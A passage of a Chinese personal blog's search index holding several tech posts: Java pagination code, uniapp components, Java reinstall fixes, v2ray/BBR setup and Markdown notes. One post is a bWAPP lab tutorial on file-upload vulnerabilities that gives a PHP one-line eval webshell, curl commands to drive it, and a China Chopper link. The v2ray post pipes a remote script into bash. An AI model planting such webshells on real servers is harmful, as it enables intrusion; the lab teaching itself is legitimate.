class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            List<span class="token operator">&lt;</span>TCustomReportDetail<span class="token operator">></span> tCustomReportDetails <span class="token operator">=</span> tCustomReportDetailMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>            tCustomReportFindByIdBody<span class="token punctuation">.</span><span class="token function">setTCustomReportDetail</span><span class="token punctuation">(</span>tCustomReportDetails<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> tCustomReportFindByIdBody<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="模糊查询并分页"><a href="#模糊查询并分页" class="headerlink" title="模糊查询并分页"></a>模糊查询并分页</h3><p>​        先查询主表，再新建一个与主表一样大小的用于分页的model（包含主从表所需的属性）列表，实例化这个列表，将主表的信息拷贝进model，在将从表的信息拷贝进model。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> PageInfo<span class="token operator">&lt;</span>TCustomReportFindByIdBody<span class="token operator">></span> <span class="token function">getTCustomReportList</span><span class="token punctuation">(</span>TCustomReportFindByKey req<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>TCustomReport<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Example<span class="token punctuation">.</span>Criteria criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getReportStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        criteria<span class="token punctuation">.</span><span class="token function">andLike</span><span class="token punctuation">(</span><span class="token string">"reportStatus"</span><span class="token punctuation">,</span> <span class="token string">"%"</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getReportStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getReportName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        criteria<span class="token punctuation">.</span><span class="token function">andLike</span><span class="token punctuation">(</span><span class="token string">"reportName"</span><span class="token punctuation">,</span> <span class="token string">"%"</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getReportName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getReportCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        criteria<span class="token punctuation">.</span><span class="token function">andLike</span><span class="token punctuation">(</span><span class="token string">"reportCode"</span><span class="token punctuation">,</span> <span class="token string">"%"</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getReportCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getReportUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        criteria<span class="token punctuation">.</span><span class="token function">andLike</span><span class="token punctuation">(</span><span class="token string">"reportUserName"</span><span class="token punctuation">,</span> <span class="token string">"%"</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getReportUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getReportUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        criteria<span class="token punctuation">.</span><span class="token function">andLike</span><span class="token punctuation">(</span><span class="token string">"reportUserId"</span><span class="token punctuation">,</span> <span class="token string">"%"</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getReportUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getOrderField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//用户自定义排序</span>        Example<span class="token punctuation">.</span>OrderBy orderBy <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">orderBy</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getOrderField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getOrderSort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"asc"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getOrderSort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                orderBy<span class="token punctuation">.</span><span class="token function">asc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                orderBy<span class="token punctuation">.</span><span class="token function">desc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//设置默认排序</span>        example<span class="token punctuation">.</span><span class="token function">orderBy</span><span class="token punctuation">(</span><span class="token string">"reportId"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">desc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    PageHelper<span class="token punctuation">.</span><span class="token function">startPage</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getPageNo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span><span class="token function">getPageSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>TCustomReport<span class="token operator">></span> dataList <span class="token operator">=</span> tCustomReportMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    PageInfo<span class="token operator">&lt;</span>TCustomReport<span class="token operator">></span> pageInfoTCustomReport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PageInfo</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//创建和主表List一样长度的主从表List</span>    List<span class="token operator">&lt;</span>TCustomReportFindByIdBody<span class="token operator">></span> tCustomReportFindByIdBody <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TCustomReportFindByIdBody</span><span class="token punctuation">[</span>dataList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//返回分页主从表</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dataList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//实例化list</span>        tCustomReportFindByIdBody<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TCustomReportFindByIdBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dataList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>dataList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> tCustomReportFindByIdBody<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Example exampleDetail <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>TCustomReportDetail<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exampleDetail<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"reportId"</span><span class="token punctuation">,</span> dataList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getReportId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            List<span class="token operator">&lt;</span>TCustomReportDetail<span class="token operator">></span> tCustomReportDetails <span class="token operator">=</span> tCustomReportDetailMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>exampleDetail<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>tCustomReportDetails <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> tCustomReportFindByIdBody<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>              tCustomReportFindByIdBody<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setTCustomReportDetail</span><span class="token punctuation">(</span>tCustomReportDetails<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    PageInfo<span class="token operator">&lt;</span>TCustomReportFindByIdBody<span class="token operator">></span> pageInfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PageInfo</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>tCustomReportFindByIdBody<span class="token punctuation">)</span><span class="token punctuation">;</span>    pageInfo<span class="token punctuation">.</span><span class="token function">setTotal</span><span class="token punctuation">(</span>pageInfoTCustomReport<span class="token punctuation">.</span><span class="token function">getTotal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pageInfo<span class="token punctuation">.</span><span class="token function">setPages</span><span class="token punctuation">(</span>pageInfoTCustomReport<span class="token punctuation">.</span><span class="token function">getPages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> pageInfo<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>❤❤注意tCustomReportFindByIdBody.set(i,new TCustomReportFindByIdBody());</p><hr>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uniapp自定义组件</title>
      <link href="/2021/04/05/guan-yu-uniapp-zhong-zi-ding-yi-zu-jian-de-feng-zhuang-ji-shi-yong/"/>
      <url>/2021/04/05/guan-yu-uniapp-zhong-zi-ding-yi-zu-jian-de-feng-zhuang-ji-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、步骤"><a href="#一、步骤" class="headerlink" title="一、步骤"></a>一、步骤</h1><h2 id="1-新建文件夹"><a href="#1-新建文件夹" class="headerlink" title="1.新建文件夹"></a>1.新建文件夹</h2><p>在项目中右键新建名为 <b> components </b> 的文件夹<br><img src="https://img-blog.csdnimg.cn/20210410211321743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><h2 id="2-新建Vue文件并封装"><a href="#2-新建Vue文件并封装" class="headerlink" title="2.新建Vue文件并封装"></a>2.新建Vue文件并封装</h2><p>文件名即可为自定义组件名（zdy.vue），<br><img src="https://img-blog.csdnimg.cn/20210410213739969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><h2 id="3-自定义组件使用"><a href="#3-自定义组件使用" class="headerlink" title="3.自定义组件使用"></a>3.自定义组件使用</h2><p><img src="https://img-blog.csdnimg.cn/2021041021222144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210410212437520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 小程序 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uniapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞[一]</title>
      <link href="/2021/03/15/web-an-quan-yi-wen-jian-shang-chuan-lou-dong-yi/"/>
      <url>/2021/03/15/web-an-quan-yi-wen-jian-shang-chuan-lou-dong-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、文件上传漏洞概述"><a href="#一、文件上传漏洞概述" class="headerlink" title="一、文件上传漏洞概述"></a>一、文件上传漏洞概述</h2><p>  文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。</p><p>文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等。</p><hr><h2 id="二、编辑木马文件并上传"><a href="#二、编辑木马文件并上传" class="headerlink" title="二、编辑木马文件并上传"></a>二、编辑木马文件并上传</h2><h3 id="1-eval函数"><a href="#1-eval函数" class="headerlink" title="1.eval函数"></a>1.eval函数</h3><p>eval( string $code)</p><p>把字符串 code 作为PHP代码执行。函数eval()语言结构允许执行任意 PHP 代码。code为 需要被执行的字符串 。</p><p>代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。</p><hr><h3 id="2-PHP一句话木马"><a href="#2-PHP一句话木马" class="headerlink" title="2.PHP一句话木马"></a>2.PHP一句话木马</h3><pre><code>&lt;?php @eval($_POST[&#39;hacker&#39;]); ?&gt;</code></pre><p>新建文本文件写入PHP一句话木马，并将txt后缀改为php.</p><p><img src="https://img-blog.csdnimg.cn/20210314115226333.png"></p><hr><h3 id="3-上传PHP文件"><a href="#3-上传PHP文件" class="headerlink" title="3.上传PHP文件"></a>3.上传PHP文件</h3><p>登录bwapp靶场后选择Unrestricted File Upload,文件上传漏洞上传文件，上传后可以看到路径为   靶场路径+/images/shell.php</p><p><img src="https://img-blog.csdnimg.cn/20210314115551830.png"><br><img src="https://img-blog.csdnimg.cn/20210314115616674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><hr><h3 id="4-webshell执行命令"><a href="#4-webshell执行命令" class="headerlink" title="4.webshell执行命令"></a>4.webshell执行命令</h3><p>在cmd执行</p><pre><code>curl -d &quot;hacker=echo get_current_user();&quot; 靶场路径/images/shell.phpcurl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></pre><p>get_current_user — 获取当前 PHP 脚本所有者名称</p><p>getcwd — 取得当前工作目录。<br><img src="https://img-blog.csdnimg.cn/20210314115808496.png"></p><hr><h3 id="5-使用中国菜刀连接"><a href="#5-使用中国菜刀连接" class="headerlink" title="5.使用中国菜刀连接"></a>5.使用中国菜刀连接</h3><p>下载链接：<a href="https://github.com/raddyfiy/caidao-official-version">https://github.com/raddyfiy/caidao-official-version</a></p><p>打开软件后，右键添加SHELL连接即可。</p><p><img src="https://img-blog.csdnimg.cn/20210314120042500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210314120010248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><hr><h3 id="6-不同语言一句话木马"><a href="#6-不同语言一句话木马" class="headerlink" title="6.不同语言一句话木马"></a>6.不同语言一句话木马</h3><p><img src="https://img-blog.csdnimg.cn/20210314120109482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 文件上传漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于java环境重装的问题</title>
      <link href="/2021/03/01/java-huan-jing-chong-zhuang/"/>
      <url>/2021/03/01/java-huan-jing-chong-zhuang/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>由于上次加装固态硬盘，导致java环境失效，所以将其卸载重装。 </p></blockquote><hr><h2 id="java环境变量配置"><a href="#java环境变量配置" class="headerlink" title="java环境变量配置"></a>java环境变量配置</h2><pre><code>#添加系统变量新建变量名：JAVA_HOME 变量值：java安装路径，如F:\Program Files\Java\jdk1.8.0_221新建变量名：classpath 变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar (前面的.不要漏掉)在Path变量中加入变量值：.;%JAVA_HOME%\bin;（加在最前面）</code></pre><hr><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><pre><code>Error: opening registry key &#39;Software\JavaSoft\JavaRuntime Environment&#39; Error: could not find java.dllError: Could not find Java SE Runtime Environment. </code></pre><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul><li>Windows键+r 输入regedit打开注册表</li><li>依次进入目录HKEY_LOCAL_MACHINE—–&gt;SOFTWARE—–&gt;JavaSoft—–&gt;Java Development Kit</li><li>查看文件，将旧的文件删除</li><li>进入C:\Windows\System32找到java.exe和javaw.exe并将它们删除（地址栏中输入**%SystemRoot%\system32**也可进入该路径）</li><li>cmd命令行运行java -version验证环境是否配置成功。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云香港轻量云服务器使用笔记</title>
      <link href="/2021/02/28/v2ray/"/>
      <url>/2021/02/28/v2ray/</url>
      
        <content type="html"><![CDATA[<h2 id="v2ray搭建"><a href="#v2ray搭建" class="headerlink" title="v2ray搭建"></a>v2ray搭建</h2><p>1.购买<strong>香港</strong>地区的轻量云服务器（Centos7+）后，开启全部的tcp和udp端口。如下图  </p><p><img src="/images/v2ray/1.png"><br><img src="/images/v2ray/2.png"></p><p>2.远程登录云服务器，运行如下命令  </p><pre><code>sudo -ibash &lt;(curl -Ls https://blog.sprov.xyz/v2-ui.sh)</code></pre><p><img src="/images/v2ray/3.png"><br><img src="/images/v2ray/4.png"><br><img src="/images/v2ray/5.png">  </p><p>3.安装完成后输入云服务器公网ip:65432进入后台，用户名密码都为admin<br><img src="/images/v2ray/6.png"><br>4.进入后台后添加账号，然后导入v2ray即可。<br><img src="/images/v2ray/7.png"><br><img src="/images/v2ray/8.png"></p><hr><h2 id="部署谷歌bbr加速"><a href="#部署谷歌bbr加速" class="headerlink" title="部署谷歌bbr加速"></a>部署谷歌bbr加速</h2><h3 id="升级Centos7内核"><a href="#升级Centos7内核" class="headerlink" title="升级Centos7内核"></a>升级Centos7内核</h3><p>内核不可低于 4.9.0<br>1.输入如下命令查看内核版本</p><pre><code>uname -r</code></pre><p>2.分别输入如下命令安装内核</p><pre><code>sudo rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.orgsudo rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpmsudo yum --enablerepo=elrepo-kernel install kernel-ml -y</code></pre><p>3.显示grub2菜单中的所有条目：</p><pre><code>sudo egrep ^menuentry /etc/grub2.cfg | cut -f 2 -d \&#39;</code></pre><p>4.从3命令显示的条目中选择要更换的内核版本，设第一个条目为0正好是我们需要的内核。则输入如下命令（第二个就为1，以此类推）</p><pre><code>sudo grub2-set-default 0</code></pre><p>5.重启系统</p><pre><code>sudo shutdown -r now</code></pre><p>6.查看内核是否更换成功(不低于4.9.0)</p><pre><code>uname -r</code></pre><hr><h3 id="启用BBR加速"><a href="#启用BBR加速" class="headerlink" title="启用BBR加速"></a>启用BBR加速</h3><p>1.输入如下命令修改配置</p><pre><code>echo &#39;net.core.default_qdisc=fq&#39; | sudo tee -a /etc/sysctl.confecho &#39;net.ipv4.tcp_congestion_control=bbr&#39; | sudo tee -a /etc/sysctl.confsudo sysctl -p</code></pre><p>2.确认已启用bbr</p><pre><code>sudo sysctl net.ipv4.tcp_available_congestion_control</code></pre><p>3.验证</p><pre><code>lsmod | grep bbr</code></pre><p>结果类似如下即成功开启bbr</p><pre><code>tcp_bbr                16384  0</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 云服务器 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v2ray </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown笔记</title>
      <link href="/2021/02/22/markdown-bi-ji/"/>
      <url>/2021/02/22/markdown-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="博客开头"><a href="#博客开头" class="headerlink" title="博客开头"></a>博客开头</h2><pre><code>title: 文章标题tags: - 标签1- 标签2categories: - 分类1- 分类2date: 发布日期updated: 更新日期summary: 文章摘要img: 文章封面author: 作者top: true    文章是否置顶，值为 true，则会作为首页推荐文章cover: false    是否需要加入到首页轮播封面中coverImg: 加入首页轮播后封面图片路径</code></pre><hr><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><pre><code># 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 </code></pre><h3 id="hexo-theme-matery多级目录"><a href="#hexo-theme-matery多级目录" class="headerlink" title="hexo-theme-matery多级目录"></a>hexo-theme-matery多级目录</h3><pre><code>## 一级目录### 二级目录</code></pre><h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><pre><code>段落的换行是使用两个以上空格加上回车</code></pre><h3 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h3><pre><code>***或- - -等</code></pre><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><pre><code>~~文本~~</code></pre><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><pre><code>&lt;u&gt;文本&lt;/u&gt;</code></pre><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><pre><code>*斜体文本***粗体文本*****粗斜体文本***</code></pre><h3 id="块引用"><a href="#块引用" class="headerlink" title="块引用"></a>块引用</h3><pre><code>&gt; 块名称多段落块在块之间加 &gt;块中块：多加 &gt;区块中可使用列表</code></pre><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><pre><code>无序列表：* 列有序列表：1. 列列表之间可通过缩进进行嵌套列表中也可使用区块</code></pre><h3 id="链接或邮箱"><a href="#链接或邮箱" class="headerlink" title="链接或邮箱"></a>链接或邮箱</h3><pre><code>[链接名称](链接地址)&lt;链接地址或邮箱&gt;</code></pre><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><pre><code>![alt 属性文本](图片地址)</code></pre><h3 id="本博客（hexo-码云）引用本地图片到博客方法"><a href="#本博客（hexo-码云）引用本地图片到博客方法" class="headerlink" title="本博客（hexo+码云）引用本地图片到博客方法"></a>本博客（hexo+码云）引用本地图片到博客方法</h3><pre><code>1. 在本地博客的source文件夹下创建用来存储图片的文件夹，如：img  2. 将图片1.jpg放入此文件夹中   3. 引用 ![图片描述](/img/1.jpg)</code></pre><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code>|  表头   | 表头  ||  ----  | ----  || 单元格  | 单元格 || 单元格  | 单元格 |  第二行-至少一个</code></pre><h2 id="Hexo常用命令"><a href="#Hexo常用命令" class="headerlink" title="Hexo常用命令"></a>Hexo常用命令</h2><pre><code>清除缓存：hexo clean生成静态文件：hexo g部署到码云：hexo d启动本地服务：hexo shexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
